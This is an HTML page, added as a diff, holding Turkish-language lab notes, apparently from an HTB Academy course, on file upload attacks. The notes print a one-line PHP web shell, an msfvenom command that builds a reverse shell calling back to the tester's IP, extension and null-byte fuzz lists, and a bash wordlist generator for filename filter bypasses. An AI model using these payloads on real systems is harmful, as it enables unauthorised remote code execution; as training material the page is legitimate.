@@ -1,0 +1,302 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>File Upload Attacks | fhk0</title><meta name="author" content="fhk0"><meta name="copyright" content="fhk0"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Absent ValidationHerhangi bir filtrelemenin olmadığı ve dosya yükleme noktasına bu eksiklikten mütevellit istediğimiz dosyaları yükleyebildiğimiz güvenlik düzeyidir. Yani herhangi bir güvenlik dahi yo">
+<meta property="og:type" content="article">
+<meta property="og:title" content="File Upload Attacks">
+<meta property="og:url" content="https://fhk0.github.io/2022/09/16/File-Upload-Attacks/index.html">
+<meta property="og:site_name" content="fhk0">
+<meta property="og:description" content="Absent ValidationHerhangi bir filtrelemenin olmadığı ve dosya yükleme noktasına bu eksiklikten mütevellit istediğimiz dosyaları yükleyebildiğimiz güvenlik düzeyidir. Yani herhangi bir güvenlik dahi yo">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://fhk0.github.io/img/content-images/htb-academy/File%20Upload%20Attacks%20461a571f3e7e47949bfd55a6cd9981e2/fileuploadattacks.jpg">
+<meta property="article:published_time" content="2022-09-16T05:24:05.000Z">
+<meta property="article:modified_time" content="2022-09-16T06:01:45.262Z">
+<meta property="article:author" content="fhk0">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://fhk0.github.io/img/content-images/htb-academy/File%20Upload%20Attacks%20461a571f3e7e47949bfd55a6cd9981e2/fileuploadattacks.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://fhk0.github.io/2022/09/16/File-Upload-Attacks/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'File Upload Attacks',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-09-16 09:01:45'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.2.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/mrrobot.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">18</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">5</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/whoami/"><i class="fa-fw fa-solid fa-circle-user"></i><span> About</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/content-images/htb-academy/File%20Upload%20Attacks%20461a571f3e7e47949bfd55a6cd9981e2/fileuploadattacks.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">fhk0</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/whoami/"><i class="fa-fw fa-solid fa-circle-user"></i><span> About</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">File Upload Attacks</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2022-09-16T05:24:05.000Z" title="Created 2022-09-16 08:24:05">2022-09-16</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2022-09-16T06:01:45.262Z" title="Updated 2022-09-16 09:01:45">2022-09-16</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/HTB-Academy/">HTB Academy</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/HTB-Academy/Bug-Bounty-Hunter/">Bug Bounty Hunter</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="File Upload Attacks"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Absent-Validation"><a href="#Absent-Validation" class="headerlink" title="Absent Validation"></a>Absent Validation</h1><p>Herhangi bir filtrelemenin olmadığı ve dosya yükleme noktasına bu eksiklikten mütevellit istediğimiz dosyaları yükleyebildiğimiz güvenlik düzeyidir. Yani herhangi bir güvenlik dahi yoktur. Genellikle buralarda ya web shell kullanırız ya da reverse shell alırız. </p>
+<div class="note info flat"><p>🌐 <strong>Web Shell Nedir?:</strong> A Web Shell provides us with an easy method to interact with the back-end server by accepting shell commands and printing their output back to us within the web browser. A web shell has to be written in the same programming language that runs the web server, as it runs platform-specific functions and commands to execute system commands on the back-end server, making web shells non-cross-platform scripts. So, the first step would be to identify what language runs the web application.</p>
+</div>
+
+<p>Shell atabilmemiz için karşımızdaki sayfanın hangi uzantıya sahip olduğunu bilmeliyiz. Yani bu sayfa .html mi .php mi .asp mi ona göre scriptimizi yazacağız. Bunu belirlemek için fuzz’lama yapabiliriz, index.html-index.php-index.asp şeklinde denemeler gerçekleştirebiliriz ya da wappalyzer gibi uygulamalar-eklentiler kullanabiliriz.</p>
+<p>Şimdi elimizde bir php sayfası olduğunu düşünelim. Bu sayfanın bir dosya yükleme alanı var ve ben bunu bildiğim için içerisinde kendi komutlarımı çalıştırmak istiyorum. İlk olarak host ismini öğrenmek istiyorum ve aşağıdaki gibi tek satır kodluk bir script yazıyorum:</p>
+<p><img src="/img/content-images/htb-academy/File%20Upload%20Attacks%20461a571f3e7e47949bfd55a6cd9981e2/Untitled.png" alt="Untitled"></p>
+<p>Sonrasında bunu dosya yükleme alanına yüklüyorum:</p>
+<p><img src="/img/content-images/htb-academy/File%20Upload%20Attacks%20461a571f3e7e47949bfd55a6cd9981e2/Untitled%201.png" alt="Untitled"></p>
+<p>Dosyaya eriştiğim zaman kodum çalışmıyor oluyor ve hostname’i elde etmiş oluyorum:</p>
+<p><img src="/img/content-images/htb-academy/File%20Upload%20Attacks%20461a571f3e7e47949bfd55a6cd9981e2/Untitled%202.png" alt="Untitled"></p>
+<hr>
+<p>Web Shell için birçok alternatif var. Bunlardan en göze çarpanı <a target="_blank" rel="noopener" href="https://github.com/Arrexel/phpbash">https://github.com/Arrexel/phpbash</a> aracıdır. Bu araç ile sanki terminal kullanırmışçasına bir deneyimle karşı taraf hakkında bilgi edinebiliriz.</p>
+<p>Bir diğer alternatif de kendi web shell’imizi yazmaktır. Sistem komutlarını kullanarak kendi basit shell’imizi yazabiliriz:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>Örneğin yukarıdaki kodu script dosyası haline getirip karşı tarafa yükledikten sonra sonucu görmek için <code>http://SERVER_IP:PORT/uploads/shell.php?cmd=id</code> uzantısına gitmemiz gerekir:</p>
+<p><img src="/img/content-images/htb-academy/File%20Upload%20Attacks%20461a571f3e7e47949bfd55a6cd9981e2/Untitled%203.png" alt="Untitled"></p>
+<p>Bu uzantıya gittiğimiz zaman komutumuz çalışmış olacak ve istediğimiz bilgiye erişmiş olacağız. Kullanımı çok kolay olmasa da eğer başka bir yöntem yoksa bu yöntem hayat kurtarabilir.</p>
+<div class="note info flat"><p>🌐 <strong>Not:</strong> Web shell’den gelen cevabı HTML render’ından geçmeden görmekte fayda vardır çünkü gelen cevap bu render sonucu bozulabilir. O yüzden <code>CTRL + U</code> ile kaynak üzerinden ham şekilde görüntülemek gerekir.</p>
+</div>
+
+<h2 id="Reverse-Shell"><a href="#Reverse-Shell" class="headerlink" title="Reverse Shell"></a>Reverse Shell</h2><p>En bilinen <a target="_blank" rel="noopener" href="https://github.com/pentestmonkey/php-reverse-shell">https://github.com/pentestmonkey/php-reverse-shell</a> bu reverse shell kullanılabilir. Tek yapılması gereken 49. ve 50. satırları kendimize göre düzenlemektir.</p>
+<p>Bir diğer yöntem de kendi reverse shell’imizi oluşturmaktır. Bunun için kendimiz elimizle de yazabiliriz ya da <code>msfvenom</code> ile otomatik oluşturabiliriz.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw &gt; reverse.php</span><br><span class="line">...SNIP...</span><br><span class="line">Payload size: 3033 bytes</span><br></pre></td></tr></table></figure>
+
+<p>Yukarıdaki komut dizesinde <code>-p</code> flag’i farklı reverse shell türlerini temsil etmekte ve <code>-f</code> flag’i çıktı dilini temsil etmektedir. </p>
+<hr>
+<h1 id="Filtrelemeleri-Atlatmak"><a href="#Filtrelemeleri-Atlatmak" class="headerlink" title="Filtrelemeleri Atlatmak"></a>Filtrelemeleri Atlatmak</h1><p>Çoğu filtreleme front-end tarafında yapıldığı için bu filtrelemeleri atlatabiliriz. Bunu antlamanın basit yolu dosyamızı seçtikten sonra sayfa hiçbir zaman yenilenmezse veya herhangi bir HTTP isteği göndermezse o zaman işlemler front-end tarafta oluyor demektir. </p>
+<p><strong>Any code that runs on the client-side is under our control.</strong> 😈</p>
+<p>Özetle, filtreleri atlatmak için ya giden HTTP isteğini manipüle edeceğiz ya da front-end taraftaki kodu devre dışı bırakacağız. Şimdi bu konuları inceleyelim.</p>
+<h2 id="Back-end-Request-Modification"><a href="#Back-end-Request-Modification" class="headerlink" title="Back-end Request Modification"></a><strong><strong>Back-end Request Modification</strong></strong></h2><p>HTTP isteklerini manipüle ederken ne kullanıyorduk? Tabii ki Burp Suite. </p>
+<p><img src="/img/content-images/htb-academy/File%20Upload%20Attacks%20461a571f3e7e47949bfd55a6cd9981e2/Untitled%204.png" alt="Untitled"></p>
+<p>Dosya yüklerken bir POST isteği gönderiyoruz ve bu POST isteği içerisinde dosya adımız ve dosyanın içeriği de bulunmakta. Dosya&#x2F;resim yüklemesi yaparken buradaki içerikleri manipüle ederek kendi shell’imizi yükleyebiliriz.</p>
+<p><img src="/img/content-images/htb-academy/File%20Upload%20Attacks%20461a571f3e7e47949bfd55a6cd9981e2/Untitled%205.png" alt="Untitled"></p>
+<p>Dosya adını uzantısı uzantımıza uyacak şekilde değiştirip içeriği de shell kodu olarak değiştirirsek kendi shell’imizi karşı tarafa yüklemiş oluruz. Ardından dosyayı yüklendiği yerde ziyaret ederek remote code execution elde edebiliriz.</p>
+<h2 id="Disabling-Front-end-Validation"><a href="#Disabling-Front-end-Validation" class="headerlink" title="Disabling Front-end Validation"></a><strong><strong>Disabling Front-end Validation</strong></strong></h2><p>Elimizde şu şekilde bir kod olduğunu düşünelim:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;uploadFile&quot;</span> <span class="attr">id</span>=<span class="string">&quot;uploadFile&quot;</span> <span class="attr">onchange</span>=<span class="string">&quot;checkFile(this)&quot;</span> <span class="attr">accept</span>=<span class="string">&quot;.jpg,.jpeg,.png&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>Burada checkFile fonksiyonu bir kontrol yapmakta ve accept parametresi de kabul edilecek dosya uzantılarını belirtmekte. Eğer bunları ortadan kaldırırsak o zaman istediğimiz şekilde yükleme yapabiliriz.</p>
+<h1 id="Dosya-Uzantisi-Bloklandigi-Zaman-Ne-Yapacagiz"><a href="#Dosya-Uzantisi-Bloklandigi-Zaman-Ne-Yapacagiz" class="headerlink" title="Dosya Uzantısı Bloklandığı Zaman Ne Yapacağız?"></a>Dosya Uzantısı Bloklandığı Zaman Ne Yapacağız?</h1><p>Dosya uzantılarının genelde hepsi bloklanmaz. Bunun için uzantı fuzz’laması yapacağız. Bu fuzz’lama işlemini de dosya yükleme HTTP isteği üzerinde gerçekleştireceğiz ve tabii ki burada yardımımıza Burp Suite koşacak. </p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">.jpeg.php</span><br><span class="line">.jpg.php</span><br><span class="line">.png.php</span><br><span class="line">.php</span><br><span class="line">.php3</span><br><span class="line">.php4</span><br><span class="line">.php5</span><br><span class="line">.php7</span><br><span class="line">.php8</span><br><span class="line">.pht</span><br><span class="line">.phar</span><br><span class="line">.phpt</span><br><span class="line">.pgif</span><br><span class="line">.phtml</span><br><span class="line">.phtm</span><br><span class="line">.php%00.gif</span><br><span class="line">.php\x00.gif</span><br><span class="line">.php%00.png</span><br><span class="line">.php\x00.png</span><br><span class="line">.php%00.jpg</span><br><span class="line">.php\x00.jpg</span><br></pre></td></tr></table></figure>
+
+<p>Yukarıdaki ilginç php uzantıları listesini web uygulamasında deneyelim. Normal olarak bir resim dosyası yükleyeceğiz ve bu yüklenen resim üzerinden sniper atak metodu ile resmin uzantısını yukarıdaki listedekilerle değiştirip acaba engelleniyor mu yoksa engellenmiyor mu şeklinde inceleyeceğiz. </p>
+<p>Burp HTTP History üzerinden elde ettiğimiz upload işlemini Burp Intruder’a yollayalım. Ardından payload pozisyonunu dosyanın uzantısı olarak belirleyelim:</p>
+<p><img src="/img/content-images/htb-academy/File%20Upload%20Attacks%20461a571f3e7e47949bfd55a6cd9981e2/Untitled%206.png" alt="Untitled"></p>
+<p>Sonrasında uzantı dosyamızı payload options alanına yükleyelim:</p>
+<p><img src="/img/content-images/htb-academy/File%20Upload%20Attacks%20461a571f3e7e47949bfd55a6cd9981e2/Untitled%207.png" alt="Untitled"></p>
+<p>Dikkat etmemiz gereken buradaki ayarın tikini kaldırmaktır:</p>
+<p><img src="/img/content-images/htb-academy/File%20Upload%20Attacks%20461a571f3e7e47949bfd55a6cd9981e2/Untitled%208.png" alt="Untitled"></p>
+<p>Çünkü o zaman <code>.</code> işaretini de URL-encode edecektir ve bizim uzantılarımızın formatı bozulacaktır. Bu adımlardan sonra saldırıya hazırız demektir. Saldırıyı başlatalım ve sonuçları inceleyelim:</p>
+<p><img src="/img/content-images/htb-academy/File%20Upload%20Attacks%20461a571f3e7e47949bfd55a6cd9981e2/Untitled%209.png" alt="Untitled"></p>
+<p>Sonuçlara baktığımızda uzunluğu <code>193</code> olanların <code>File successfully uploaded</code> olarak bize başarı mesajı döndürdüğünü görüyoruz. Yani uzantısı 193 olan uzantıları kullanarak biz karşı tarafa yüklemeler yapabiliriz.</p>
+<p><img src="/img/content-images/htb-academy/File%20Upload%20Attacks%20461a571f3e7e47949bfd55a6cd9981e2/Untitled%2010.png" alt="Untitled"></p>
+<p>Burada dikkat etmemiz gereken şudur ki uzantı yüklenebiliyor olsa da php kodu çalıştıramayabilir. O yüzden farklı farklı uzantılar denemek gerekebilir.</p>
+<p><img src="/img/content-images/htb-academy/File%20Upload%20Attacks%20461a571f3e7e47949bfd55a6cd9981e2/Untitled%2011.png" alt="Untitled"></p>
+<p>Örneğin yukarıda birçok deneme yapmış olmama rağmen yalnızca <code>.phar</code> uzantısı php kodlarını çalıştırabildim.</p>
+<h2 id="Whitelist-Filters"><a href="#Whitelist-Filters" class="headerlink" title="Whitelist Filters"></a><strong><strong>Whitelist Filters</strong></strong></h2><p>Kara listedekiler adı üzerinde engellenen ögelerken beyaz listedekiler de kabul edilen ögelerdir. Bir back-end sunucudaki php kodunda hem kara liste hem de beyaz liste bulunabilir. Ayarı tam yapılmamış ya da güncelliğini yitirmiş sunucularda bu filtrelemeleri atlatmada başarılı olabiliriz.</p>
+<p>Aşağıdaki wordlist’i kullanıp fuzz’lama yaparak hangi ögelerin beyaz listede olduğunu belirleyebiliriz:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">.asp</span><br><span class="line">.aspx</span><br><span class="line">.bat</span><br><span class="line">.c</span><br><span class="line">.cfm</span><br><span class="line">.cgi</span><br><span class="line">.css</span><br><span class="line">.com</span><br><span class="line">.dll</span><br><span class="line">.exe</span><br><span class="line">.htm</span><br><span class="line">.html</span><br><span class="line">.inc</span><br><span class="line">.jhtml</span><br><span class="line">.js</span><br><span class="line">.jsa</span><br><span class="line">.jsp</span><br><span class="line">.log</span><br><span class="line">.mdb</span><br><span class="line">.nsf</span><br><span class="line">.pcap</span><br><span class="line">.php</span><br><span class="line">.php2</span><br><span class="line">.php3</span><br><span class="line">.php4</span><br><span class="line">.php5</span><br><span class="line">.php6</span><br><span class="line">.php7</span><br><span class="line">.phps</span><br><span class="line">.pht</span><br><span class="line">.phtml</span><br><span class="line">.pl</span><br><span class="line">.reg</span><br><span class="line">.sh</span><br><span class="line">.shtml</span><br><span class="line">.sql</span><br><span class="line">.swf</span><br><span class="line">.txt</span><br><span class="line">.xml</span><br></pre></td></tr></table></figure>
+
+<p>Bazı kodlarla güvenlik önlemi olarak örneğin geçerli bir uzantının bulunmasının (ör. .jpg’nin, .png’nin bulunmasının) yeterli olacağını belirtiyor. Bu durumlarda <code>shell.jpg.php</code> şeklindeki bir kullanıma gidebiliriz. </p>
+<p><img src="/img/content-images/htb-academy/File%20Upload%20Attacks%20461a571f3e7e47949bfd55a6cd9981e2/Untitled%2012.png" alt="Untitled"></p>
+<p>Bu sayede dosya bir script dosyası olmasına rağmen içerisinde <code>.jpg</code> barındırdığı için filtreden geçmiş olur.</p>
+<p>Bazı durumlarda da tam tersi olur. .php veya benzer uzantı barındıran herhangi bir uzantı kabul edilir ve çalıştırılır.</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">FilesMatch</span> &quot;<span class="attr">.</span>+\<span class="attr">.ph</span>(<span class="attr">ar</span>|<span class="attr">p</span>|<span class="attr">tml</span>)&quot;&gt;</span></span><br><span class="line">    SetHandler application/x-httpd-php</span><br><span class="line"><span class="tag">&lt;/<span class="name">FilesMatch</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>Yukarıdaki ayar <code>phar</code>, <code>php</code> ve <code>ptml</code> uzantılarının beyaz listeye alındığına işaret eder ve bu dosyaları çalıştırır. Bu da içerisinde bu üç uzantıdan herhangi birini barındıran bir dosyanın çalıştırılacağı manasına gelir. Bunun hatanın oluşmasının nedeni komutun sonuna <code>$</code> işaretinin konmamasıdır. Bu durumdan hareketle bu sefer uzantımızı <code>shell.php.jpg</code> olarak bir önceki durumun tam tersi şekilde ayarlayacağız.</p>
+<p><img src="/img/content-images/htb-academy/File%20Upload%20Attacks%20461a571f3e7e47949bfd55a6cd9981e2/Untitled%2013.png" alt="Untitled"></p>
+<p>Sonuç olarak shell’imizi karşıya yükleyebildik.</p>
+<p>Bir diğer yöntem de karakter enjeksiyonudur. Aşağıdaki karakterler farklı yerlere eklenerek bizlere bypass işlemi sağlayabilir:</p>
+<ul>
+<li><code>%20</code></li>
+<li><code>%0a</code></li>
+<li><code>%00</code></li>
+<li><code>%0d0a</code></li>
+<li><code>/</code></li>
+<li><code>.\</code></li>
+<li><code>.</code></li>
+<li><code>…</code></li>
+<li><code>:</code></li>
+</ul>
+<p>Hangilerinin çalıştığını görmek için kendi wordlistimizi oluşturalım. Bunun için şöyle bir bash script’i yazabiliriz:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> <span class="string">&#x27;%20&#x27;</span> <span class="string">&#x27;%0a&#x27;</span> <span class="string">&#x27;%00&#x27;</span> <span class="string">&#x27;%0d0a&#x27;</span> <span class="string">&#x27;/&#x27;</span> <span class="string">&#x27;.\\&#x27;</span> <span class="string">&#x27;.&#x27;</span> <span class="string">&#x27;…&#x27;</span> <span class="string">&#x27;:&#x27;</span>; <span class="keyword">do</span></span><br><span class="line">    <span class="keyword">for</span> ext <span class="keyword">in</span> <span class="string">&#x27;.php&#x27;</span> <span class="string">&#x27;.phps&#x27;</span>; <span class="keyword">do</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;shell$char<span class="variable">$ext</span>.jpg&quot;</span> &gt;&gt; wordlist.txt</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;shell$ext<span class="variable">$char</span>.jpg&quot;</span> &gt;&gt; wordlist.txt</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;shell.jpg$char<span class="variable">$ext</span>&quot;</span> &gt;&gt; wordlist.txt</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;shell.jpg$ext<span class="variable">$char</span>&quot;</span> &gt;&gt; wordlist.txt</span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
+<p>Kendimize göre oluşturduğumuz bu wordlist ile fuzz’lama yapıp daha rahat bir şekilde sonuca ulaşabiliriz.</p>
+<hr>
+<p><strong>Ufak bir vaka çalışması:</strong></p>
+<p>Bu vaka çalışması yukarıdaki örnekle paralel olduğu için yapacağım şeyler aslında belli:</p>
+<ul>
+<li>Beyaz listeyi oluştur.</li>
+<li>Kara listeyi oluştur.</li>
+<li>Bunları birbirine uzantı olarak kaynaştır ve karakter enjeksiyonunu da dahil ederek yeni uzantı listesi oluştur.</li>
+<li>Bu listeyi kullanarak fuzz’lama yap ve hangi uzantının&#x2F;uzantıların çalıştığını bul.</li>
+<li>Bulduğun uzantıyı shell’inin adına ekle ve onu yükle.</li>
+</ul>
+<p>Öncelikle yukarıda belirtilen beyaz liste uzantılarının fuzzlamasını gerçekleştirelim.</p>
+<p><img src="/img/content-images/htb-academy/File%20Upload%20Attacks%20461a571f3e7e47949bfd55a6cd9981e2/Untitled%2014.png" alt="Untitled"></p>
+<p>Yukarıdaki şekilde direkt olarak kabul etmedi. Bu sefer ben de .jpg sonda kalacak şekilde uzantı eklemesi yaptım:</p>
+<p><img src="/img/content-images/htb-academy/File%20Upload%20Attacks%20461a571f3e7e47949bfd55a6cd9981e2/Untitled%2015.png" alt="Untitled"></p>
+<p>Sonuç:</p>
+<p><img src="/img/content-images/htb-academy/File%20Upload%20Attacks%20461a571f3e7e47949bfd55a6cd9981e2/Untitled%2016.png" alt="Untitled"></p>
+<p>Görüldüğü üzere uzunluğu 193 olanlar çalıştı demektir. Bu da uzantısı .php ya da türevi olan hiçbir dosyanın yüklenemediği manasına geliyor.</p>
+<p>Çalışan uzantıları buldum. Şimdi .jpg’nin de kabul edildiğini biliyorum. O zaman bu uzantıları kaynaştırıp yeni wordlistler oluşturalım. Php script çalıştıracağım için yukarıdaki sonuçlarda olumlu olarak dönen .pht ve .phtml uzantılarını dahil edeceğim.</p>
+<p>Python kodumu şu şekilde yazdım:</p>
